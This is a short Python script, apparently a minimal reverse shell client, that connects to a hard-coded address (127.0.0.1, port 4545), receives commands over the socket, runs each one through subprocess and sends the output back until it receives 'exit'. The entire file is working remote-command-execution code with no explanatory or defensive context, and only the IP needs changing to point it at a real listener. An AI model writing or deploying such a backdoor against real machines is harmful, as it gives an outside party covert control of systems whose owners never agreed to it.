import socket
import subprocess
import shlex

ip = "127.0.0.1"
port = 4545
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip,port))
while True :
    c = sock.recv(1024).decode()
    if c != "exit":
        command_line = shlex.split(c)
        command = subprocess.run(command_line,stdout=subprocess.PIPE)
        sock.send(command.stdout)
    else :
        sock.close()
        break